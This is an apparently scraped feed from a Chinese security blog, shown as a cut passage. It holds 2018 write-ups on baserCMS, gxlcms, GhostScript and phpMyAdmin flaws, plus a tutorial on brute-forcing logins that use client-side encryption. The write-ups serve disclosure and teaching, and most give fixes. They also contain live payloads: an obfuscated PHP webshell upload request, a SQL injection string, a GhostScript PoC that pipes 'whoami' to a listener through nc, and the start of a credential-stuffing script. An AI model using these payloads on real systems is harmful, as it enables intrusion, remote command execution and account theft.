class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfOCEZtinjMBherH4</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/basercms/admin/theme_configs/form</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: BASERCMS=vfshte61c73tufbvit1j63amv2</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</span><br><span class="line">Content-Disposition: form-data; name=&quot;_method&quot;</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</span><br><span class="line">Content-Disposition: form-data; name=&quot;data[_Token][key]&quot;</span><br><span class="line"></span><br><span class="line">65d6c82611c9eb9840aef42c97d82c36847093f574cbe4c2cb7964537a3d594b19d92b9c116bd3595e0f14ba510a880e1a2573033f81a71dd25800d09917183a</span><br><span class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</span><br><span class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][color_main]&quot;</span><br><span class="line"></span><br><span class="line">e371e3</span><br><span class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</span><br><span class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][color_sub]&quot;</span><br><span class="line"></span><br><span class="line">21b537</span><br><span class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</span><br><span class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][color_link]&quot;</span><br><span class="line"></span><br><span class="line">1808f5</span><br><span class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</span><br><span class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][color_hover]&quot;</span><br><span class="line"></span><br><span class="line">ed8815</span><br><span class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</span><br><span class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][logo]&quot;; filename=&quot;x.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php  $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;  $a($_GET[cc]);  ?&gt;</span><br><span class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</span><br><span class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][logo_alt]&quot;</span><br><span class="line"></span><br><span class="line">baserCMS</span><br><span class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</span><br><span class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][logo_link]&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>Then according to the code description, you can get the webshell path:<br><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS9iYXNlcmNtcy9maWxlcy90aGVtZV9jb25maWdzL2xvZ28ucGhw" title="http://127.0.0.1/basercms/files/theme_configs/logo.php">http://127.0.0.1/basercms/files/theme_configs/logo.php<i class="fa fa-external-link"></i></span><br>Command execution:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-11.png" alt="图11"></p><h4 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution:"></a>Solution:</h4><p>Whitelist restrictions on upload file suffixes such as (jpg, png, gif, jpeg etc.)<br>Note: The issue has been reported in 2018 09 and was resolved by a developer of baserCMS. <span class="exturl" data-url="aHR0cHM6Ly9iYXNlcmNtcy5uZXQvbmV3cy9hcmNoaXZlcy81NzQ=" title="https://basercms.net/news/archives/574">Announcement address<i class="fa fa-external-link"></i></span></p><h3 id="Vulnerability-information-page"><a href="#Vulnerability-information-page" class="headerlink" title="Vulnerability information page:"></a>Vulnerability information page:</h3><p><span class="exturl" data-url="aHR0cHM6Ly9iYXNlcmNtcy5uZXQvc2VjdXJpdHkvQ1ZFLTIwMTgtMTg5NDJfQ1ZFLTIwMTgtMTg5NDM=" title="https://basercms.net/security/CVE-2018-18942_CVE-2018-18943">https://basercms.net/security/CVE-2018-18942_CVE-2018-18943<i class="fa fa-external-link"></i></span></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h3&gt;&lt;p&gt;baserCMS（ベーサーシーエムエス）とは、直感的な操作と高いメンテナンス性を実現し、Webサイトを自由にカスタマイズできる国産CMS（コンテンツ・マネージメント・システム）です。日本人が日本人の為に、みんなで作っているオープンソース・ソフトウェアです。無料で利用でき、様々なサーバーで動作可能で、インストールも簡単です。
    
    </summary>
    
      <category term="WEB安全" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="baserCMS" scheme="http://sunu11.com/tags/baserCMS/"/>
    
      <category term="漏洞披漏" scheme="http://sunu11.com/tags/%E6%BC%8F%E6%B4%9E%E6%8A%AB%E6%BC%8F/"/>
    
      <category term="代码审计" scheme="http://sunu11.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>glxcms漏洞披漏</title>
    <link href="http://sunu11.com/2018/10/18/glxcms/"/>
    <id>http://sunu11.com/2018/10/18/glxcms/</id>
    <published>2018-10-18T09:56:39.000Z</published>
    <updated>2018-11-03T12:01:48.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="cms简介"><a href="#cms简介" class="headerlink" title="cms简介"></a>cms简介</h3><p>Gxlcms新闻系统是一个以php+mysql进行开发的新闻类cms内容管理系统。<br>Gxlcms新闻系统的优势：前台与后台采用隔离方式，模板化设计，<a id="more"></a>让只要你会前端就可以做一个新闻网站！后台设计简单明了，小白用户一看就会明白！程序功能也非常完善！<br>1.目前程序支持三种路由模式：静态生成，伪静态，动态；<br>2.支持两种存储模式：本地存储，FTP存储<br>3.接入百度主动推送功能！让你每篇新闻/资讯都可以及时被百度发现<br>4.图片水印功能：只要开启图片水印，不管是标图图片或者是内容图片统统添加水印，水印功能支持9宫格设计，让你可以随意把图片水印加到任意地方<br>5.数据库一键备份/还原，让你可以轻松的把网站迁移到任何服务器上<br>6.缓存功能：模板缓存，数据库缓存，网站页面缓存<br>7.友情链接：支持图片链接和文字链接<br>8.广告模块：只要后台添加广告后，全部js生成到前台，让你不用费事修改模板<br>9.采集功能，我们支持火车头采集，火车头接口已经在插件中心里面，只需要你下载后，就可以采集上万新闻内容，为了防止重名新闻，我们对接口做了细腻化的功能，支持入库重名判断，当有重名新闻自动过滤<br>10.扩展功能：扩展性，可以在插件中心下载，招聘模块，图集模块，会员中心模块，交友模块等等模块进行安装（开发中）<br><span class="exturl" data-url="aHR0cHM6Ly9naXRlZS5jb20vZ3hsY21zL0d4bGNtc3YyLjAtMjAxODA5MTU=" title="https://gitee.com/gxlcms/Gxlcmsv2.0-20180915">源码下载地址:<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cDovL25ld3MuZ3hsY21zLmNvbS8=" title="http://news.gxlcms.com/">Demo地址：<i class="fa fa-external-link"></i></span><br>官网更新补丁链接：待补充</p><h3 id="漏洞详情："><a href="#漏洞详情：" class="headerlink" title="漏洞详情："></a>漏洞详情：</h3><h4 id="1、后台sql注入漏洞-CVE-2018-18488"><a href="#1、后台sql注入漏洞-CVE-2018-18488" class="headerlink" title="1、后台sql注入漏洞(CVE-2018-18488)"></a>1、后台sql注入漏洞(CVE-2018-18488)</h4><h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>从\lib\admin\action\dataaction.class.php文件中处理数据库备份方法可知：<br>$table是从$_POST[‘ids’]中传入，且可控。然后，在32行代码中与TRUNCATE TABLE 拼接存入sql文件，然后在后续导入还原功能中执行，因此我们可以控制生成的sql文件，并且执行任意sql语句。<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-1.png" alt="图1"><br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-2.png" alt="图2"><br>构造sql注入语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ids%5B%5D=gxl_actor`;</span><br><span class="line">select sleep(3);--%20</span><br></pre></td></tr></table></figure></p><p>我们发送数据包后，生成的sql文件如下所示：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-3.png" alt="图3"><br>然后在进行备份还原：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-4.png" alt="图4"><br>可看到延迟，我们注入select sleep(1)后通过sql备份还原功能执行sql文件：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-5.png" alt="图5"><br>因此判断存在注入。</p><h5 id="修复建议："><a href="#修复建议：" class="headerlink" title="修复建议："></a>修复建议：</h5><p>对ids参数值进行过滤</p><h4 id="2、前台任意sql备份文件下载：-CVE-2018-18487"><a href="#2、前台任意sql备份文件下载：-CVE-2018-18487" class="headerlink" title="2、前台任意sql备份文件下载：(CVE-2018-18487)"></a>2、前台任意sql备份文件下载：(CVE-2018-18487)</h4><h5 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>从\lib\admin\action\dataaction.class.php文件中处理数据库备份方法可知生成备份文件的方法如下：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-6.png" alt="图6"><br>看到<code>mt_rand</code>函数：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-7.png" alt="php官网"><br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-8.png" alt="先知社区"></p><p>然后结合cms的sql文件生成代码:<br><code>Sql文件名字：年月日_随机数_1.sql</code></p><p>通过随机数值来爆破种子的过程，外国朋友写了一个工具：php_mt_seed（官方使用说明：<span class="exturl" data-url="aHR0cDovL3d3dy5vcGVud2FsbC5jb20vcGhwX210X3NlZWQvUkVBRE1F" title="http://www.openwall.com/php_mt_seed/README">http://www.openwall.com/php_mt_seed/README<i class="fa fa-external-link"></i></span> ）。使用工具获得随机数，拼接sql文件名称。<br>然后在管理员未修改源码目录的情况下访问默认路径即可未授权下载备份的sql文件：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/glx-9.png" alt="图9"></p><h5 id="修复建议：-1"><a href="#修复建议：-1" class="headerlink" title="修复建议："></a>修复建议：</h5><p>可参考phpcms小于V9.6.2 authkey泄露的修复方式在每次生成随机数之前都手动播种一次，<br>或者采用时间戳的方式。</p><p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMzE=" title="https://xz.aliyun.com/t/31">https://xz.aliyun.com/t/31<i class="fa fa-external-link"></i></span></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;cms简介&quot;&gt;&lt;a href=&quot;#cms简介&quot; class=&quot;headerlink&quot; title=&quot;cms简介&quot;&gt;&lt;/a&gt;cms简介&lt;/h3&gt;&lt;p&gt;Gxlcms新闻系统是一个以php+mysql进行开发的新闻类cms内容管理系统。&lt;br&gt;Gxlcms新闻系统的优势：前台与后台采用隔离方式，模板化设计，
    
    </summary>
    
      <category term="WEB安全" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="漏洞披漏" scheme="http://sunu11.com/tags/%E6%BC%8F%E6%B4%9E%E6%8A%AB%E6%BC%8F/"/>
    
      <category term="代码审计" scheme="http://sunu11.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="glxcms" scheme="http://sunu11.com/tags/glxcms/"/>
    
  </entry>
  
  <entry>
    <title>GhostScript沙箱绕过</title>
    <link href="http://sunu11.com/2018/08/23/23/"/>
    <id>http://sunu11.com/2018/08/23/23/</id>
    <published>2018-08-23T04:41:35.000Z</published>
    <updated>2018-11-03T12:00:48.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/23-1.png" alt="23-1"></p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>8 月 21 号，Tavis Ormandy 通过公开邮件列表，再次指出 ghostscript 的安全沙箱可以被绕过，通过构造恶意的图片内容，可造成命令执行。<a id="more"></a><br>ghostscript应用广泛，ImageMagick、python-matplotlib、libmagick 等图像处理应用均有引用。<br>在ghostscript中由于以往的安全事件，针对安全问题gs官方采用增加参数-dSAFER来开启安全沙箱，但该沙箱在程序执行过程中由LockSafetyParams这个值进行控制，此次Taviso发现通过restore操作会将该值成功覆盖，导致安全沙箱被绕过，引发命令执行漏洞。</p><h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><h3 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h3><p>vps开启监听端口后，对图片上传功能进行测试，上传含有攻击数据的图片：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/23-3.png" alt="23-3"></p><p>服务器收到回显：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/23-4.png" alt="23-4"></p><h3 id="poc："><a href="#poc：" class="headerlink" title="poc："></a>poc：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">save</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span><br><span class="line">restore</span><br><span class="line">mark /OutputFile (%pipe%whoami|nc ip port) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure><h2 id="漏洞影响："><a href="#漏洞影响：" class="headerlink" title="漏洞影响："></a>漏洞影响：</h2><p>version &lt;= 9.23（全版本、全平台）<br>所有引用ghostscript的上游应用如：<br>imagemagick<br>libmagick<br>graphicsmagick<br>gimp<br>python-matplotlib<br>texlive-core<br>texmacs<br>latex2html<br>latex2rtf<br>等</p><h2 id="缓解措施："><a href="#缓解措施：" class="headerlink" title="缓解措施："></a>缓解措施：</h2><p>1、卸载ghostscript。<br>2、使用ImageMagick，建议修改policy文件。<br>（默认位置：/etc/ImageMagick/policy.xml），在 <policymap> 中加入以下 <policy>（即禁用 PS、EPS、PDF、XPS coders）<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/23-2.png" alt="23-2"> </policy></policymap></p><h2 id="参考信息："><a href="#参考信息：" class="headerlink" title="参考信息："></a>参考信息：</h2><p>1、漏洞分析：<br><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpVNU1qRXpPVE0zTkE9PSZhbXA7bWlkPTIyNDc0ODU2MTUmYW1wO2lkeD0xJmFtcDtzbj1iMjVjNDczMjRiNzcxMjY2YzBkNjJjYjQ2YzI2M2Y0MiZhbXA7Y2hrc209ZmUyNTBkYWVjOTUyODRiODFhODgyYWVlY2YzNmE1MGUzOWQ4ZmI3ZTdlODJhYzRhZmZkMTZiN2Y2MGRkYjY3NDFjOTlhZWI4NTFiMyZhbXA7c2NlbmU9MjEjd2VjaGF0X3JlZGlyZWN0" title="https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&amp;mid=2247485615&amp;idx=1&amp;sn=b25c47324b771266c0d62cb46c263f42&amp;chksm=fe250daec95284b81a882aeecf36a50e39d8fb7e7e82ac4affd16b7f60ddb6741c99aeb851b3&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&amp;mid=2247485615&amp;idx=1&amp;sn=b25c47324b771266c0d62cb46c263f42&amp;chksm=fe250daec95284b81a882aeecf36a50e39d8fb7e7e82ac4affd16b7f60ddb6741c99aeb851b3&amp;scene=21#wechat_redirect<i class="fa fa-external-link"></i></span><br>2、邮件列表：<span class="exturl" data-url="aHR0cHM6Ly9idWdzLmNocm9taXVtLm9yZy9wL3Byb2plY3QtemVyby9pc3N1ZXMvZGV0YWlsP2lkPTE2NDA=" title="https://bugs.chromium.org/p/project-zero/issues/detail?id=1640">https://bugs.chromium.org/p/project-zero/issues/detail?id=1640<i class="fa fa-external-link"></i></span></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://n-b.oss-cn-beijing.aliyuncs.com/23-1.png&quot; alt=&quot;23-1&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;8 月 21 号，Tavis Ormandy 通过公开邮件列表，再次指出 ghostscript 的安全沙箱可以被绕过，通过构造恶意的图片内容，可造成命令执行。
    
    </summary>
    
      <category term="WEB安全" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="命令执行" scheme="http://sunu11.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="GhostScript" scheme="http://sunu11.com/tags/GhostScript/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-12613漏洞学习总结</title>
    <link href="http://sunu11.com/2018/07/25/22/"/>
    <id>http://sunu11.com/2018/07/25/22/</id>
    <published>2018-07-25T07:10:45.000Z</published>
    <updated>2018-11-03T12:03:13.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>在漏洞披漏之后，就对该漏洞进行了分析复现，本来打算投freebuf，谁知道被抢了先2333，贴图留念～～～<a id="more"></a><br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-1.png" alt="22-1"></p><h4 id="CVE-2018-12613："><a href="#CVE-2018-12613：" class="headerlink" title="CVE-2018-12613："></a>CVE-2018-12613：</h4><p>2018年6月19日，phpMyAdmin在最新版本修复了一个严重级别的漏洞。攻击者必须拥有后台权限，phpMyAdmin4.8.0和4.8.1均受漏洞影响。</p><h4 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><blockquote><p>首先在如下图所示的index.php中存在一处包含指定文件的代码：</p></blockquote><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-2.png" alt="22-2"></p><blockquote><p>需要成功包含，必须满足if区间中的五个条件：target参数值不为空；target参数值为字符串；target参数值不以index开头；target参数值不在黑名单中；过checkPageValidity函数的检查。其中第四个条件的黑名单即51行中import.php与export.php；第五个条件需要查看该函数：</p></blockquote><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-3.png" alt="22-3"></p><blockquote><p>可以看到core类的checkPageValidity函数中又必须经过以下的五个判断：<br>1、$whitelist为空就引用申明的$goto_whitelist<br>2、$page如果没有定义或者$page不为字符串就返回false<br>3、$page如果存在在$whitelist中返回true<br>4、如果$_page存在在$whitelist中返回true<br>5、经过urldecode函数解码后的$_page存在在$whitelist中返回true<br>我们可以看到在index.php调用checkPageValidity函数时没有传入其他参数，因此会进入第一个判断，而$goto_whitelist如下所示：</p></blockquote><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-4.png" alt="22-4"></p><blockquote><p>它定义了很多可以被包含的文件名。然后第二个判断可以跳过；看第三个判断，可以看到$page参数是不在$whitelist中的，此处不满足；看第四个判断，这个判断是对$_page进行的，校验$_page是否在白名单中，而$_page是将$page值末尾加上’?’后从字符串第0位开始分割，取其中第一次出现?之前的内容，如下图所示：<br>target=sql.ph%3fp时：</p></blockquote><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-5.png" alt="22-5"></p><blockquote><p>因此此处可以用’$target=db_sql.php?/../../被包含文件’来满足条件，但是$target进入到index.php的include()中，被包含的文件无法打开，出现报错。（windows文件命名规则中规定了文件名不能出现特殊字符，linux为服务器的情况下，是可以使用？直接进行绕过）</p></blockquote><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-6.png" alt="22-6"></p><blockquote><p>第五个判断，先将$page进行urldecode解码，然后再进行？的分割，取值进行判断，只要解码后分割出来的值在$whitelist中即可满足条件。而在$target 里问号被二次编码为%253f， db_sql.php%253f也会被认为是一个目录，可以用../跨越，成功实现包含。因此命名规范里面没有将%放进去也是该漏洞能在windows下成功利用的一个关键点。</p></blockquote><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-7.png" alt="22-7"></p><blockquote><p>这样我们可以将？进行二次编码。如果传入target=db_sql.php%253f。在第四个判断中进行白名单校验时，为db_sql.php%3f，不满足，第五个判断的urldecode后，进行校验时为db_sql.php,符合条件，然后即可成功包含文件。</p></blockquote><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-8.png" alt="22-8"></p><h4 id="复现心得："><a href="#复现心得：" class="headerlink" title="复现心得："></a>复现心得：</h4><p>getshell方式</p><p>1、上传sql文件，然后进行包含。<br>2、开启webshell日志功能，查询webshell语句后，包含日志。<br>3、将webshell写入字段中，如果数据库在本地，可以直接通过查询数据库文件位置：select @@datadir；然后得到数据库文件存放路径，而字段内容则在数据库名/表名.frm中</p><p>说明图1：</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-9.png" alt="22-9"></p><p>说明图2：</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-10.png" alt="22-10"></p><p>4、通过phpsession文件包含，首先执行查找webshell的语句，然后在cookie中的phpmyadmin参数中可看到session文件名。<br>说明图1：</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-11.png" alt="22-11"></p><p>说明图2<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/22-12.png" alt="22-12"></p><p>getshell方式：<br>        目前官方已修复漏洞，更新至最新版本可不受此漏洞影响。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h3&gt;&lt;p&gt;在漏洞披漏之后，就对该漏洞进行了分析复现，本来打算投freebuf，谁知道被抢了先2333，贴图留念～～～
    
    </summary>
    
      <category term="WEB安全" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="phpmyadmin" scheme="http://sunu11.com/tags/phpmyadmin/"/>
    
      <category term="漏洞总结" scheme="http://sunu11.com/tags/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
      <category term="CVE-2018-12613" scheme="http://sunu11.com/tags/CVE-2018-12613/"/>
    
  </entry>
  
  <entry>
    <title>如何对经前端加密后的数据进行爆破</title>
    <link href="http://sunu11.com/2018/07/23/21/"/>
    <id>http://sunu11.com/2018/07/23/21/</id>
    <published>2018-07-23T07:50:45.000Z</published>
    <updated>2018-11-03T12:03:20.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-1-简述："><a href="#1-1-简述：" class="headerlink" title="1.1 简述："></a>1.1 简述：</h2><p>最近遇到两个个案例，经过一番倒腾，发现其登录功能均可撞库。但是都存在登录数据本地加密，有空了放一起总结记录一下。<a id="more"></a></p><h2 id="2-1-案例1-RSA本地加密"><a href="#2-1-案例1-RSA本地加密" class="headerlink" title="2.1 案例1(RSA本地加密):"></a>2.1 案例1(RSA本地加密):</h2><h3 id="2-1-1-摸底："><a href="#2-1-1-摸底：" class="headerlink" title="2.1.1 摸底："></a>2.1.1 摸底：</h3><blockquote><p>首先，进行正常登录逻辑测试，发现该系统登录逻辑分下面两步：<br>1、输入正确用户名密码，校验正确后，向注册手机号发送验证码。<br>2、输入正确验证码，登录系统。</p></blockquote><p>从该逻辑可知此处可通过填写登录用户名密码后是否发送验证码来判断输入数据是否为正确用户登录凭证，由于站点未对获取验证码提交频率作任何限制，从而可自动化提交来获取该站点正确用户名密码。</p><h3 id="2-1-2-演习："><a href="#2-1-2-演习：" class="headerlink" title="2.1.2 演习："></a>2.1.2 演习：</h3><blockquote><p>在google的过程中，很快的找到了一款burpsuite套件：jsEncrypter（感谢作者提供这么利索的插件）。下载地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2MwbnkxL2pzRW5jcnlwdGVyL3JlbGVhc2Vz44CC" title="https://github.com/c0ny1/jsEncrypter/releases。">https://github.com/c0ny1/jsEncrypter/releases。<i class="fa fa-external-link"></i></span><br>安装完成后，我们将jsencrypt.min.js下载至本地。然后对站点系统前端代码进行调试，分析前端处理过程，编写js模板文件。</p></blockquote><p>对登录过程进行调试：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-1.png" alt="21-1"></p><blockquote><p>在审计前端源代码页面中，可以找到，在ui目录下的lib文件夹下有一个security文件夹，而其中的rsa_util.js就是调用jsencrypt.min.js文件种的JSEncrypt方法对用户名密码进行加密。</p></blockquote><p>下图为动态调试结果：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-2.png" alt="21-2"></p><blockquote><p>我们可以很清楚看到加密过程，然后根据jsEncrypter的readme文档中的使用指南，我们可以根据其调用逻辑，自行编写一个jsEncrypter_rsa.js文件，来调用jsencrypt.min.js文件为我们的明文数据进行加密。</p></blockquote><p>这里有两个小坑：</p><blockquote><p>1、由动态调试可知，公钥_pubk在cookie中以url编码后的方式存储，因此，我们本地调用，需要解码一下，在这里，对于换行符，需要用\n替换。<br>2、由于jsEncrypter插件使用了phantomjs平台，而phantomjs支持url解码的函数为encodeURIComponent。因此不能使用与系统前端一致的encodeURI函数。</p></blockquote><p>然后仿写系统加密的方式，将公钥以及调用逻辑写入到我们自己的js文件中：</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-3.png" alt="21-3"></p><h3 id="2-1-3-攻击："><a href="#2-1-3-攻击：" class="headerlink" title="2.1.3 攻击："></a>2.1.3 攻击：</h3><p>1、运行phantomJS并测试</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-4.png" alt="21-4"></p><p>2、Burpsuite验证，调用成功：</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-5.png" alt="21-5"></p><p>3、抓包，加载字典，实施爆破：（两个参数的字典都使用插件）</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-6.png" alt="21-6"></p><p>然后，成功爆破:</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-7.png" alt="21-7"></p><h2 id="2-2-案例2-md5本地加密"><a href="#2-2-案例2-md5本地加密" class="headerlink" title="2.2 案例2(md5本地加密):"></a>2.2 案例2(md5本地加密):</h2><h3 id="2-2-1-摸底："><a href="#2-2-1-摸底：" class="headerlink" title="2.2.1 摸底："></a>2.2.1 摸底：</h3><blockquote><p>首先通过分析用户登录过程，发现该站点登录无验证码，可多次提交登录数据，但是其用户名密码在本地进行了md5加密处理。因此，撞库之前需要本地实现将字典进行加密操作后再提交。<br>对登录功能抓包分析后，可以看到在填写用户名密码后，前端发送如下数据包获取cd、salt数据包：</p></blockquote><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-8.png" alt="21-8"></p><p>此处存在salt泄漏风险，可遍历手机号，对于未注册⽤用户，返回值⽆salt，对于已注册⽤户salt值恒定。<br>而实施撞库，需要先请求得到salt与cd值。</p><p>然后可从前端代码中得到加密用户名密码过程：</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-9.png" alt="21-9"></p><p>pass经过本地md5加密后， 发送至服务端进行登录校验。</p><h3 id="2-2-2-演习："><a href="#2-2-2-演习：" class="headerlink" title="2.2.2 演习："></a>2.2.2 演习：</h3><p>因此，我们只需要用脚本，先输入用户名即手机号，请求得到cd、salt值，然后再从密码字典中，取出密码进行md5加密，最后发包请求即可。编写python脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding=utf-8 -*-</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import hashlib</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GetPass():</span><br><span class="line">fp = open(&quot;./pass.txt&quot;,&quot;r&quot;)</span><br><span class="line">if fp == 0:</span><br><span class="line">print (&quot;open file error!&quot;)</span><br><span 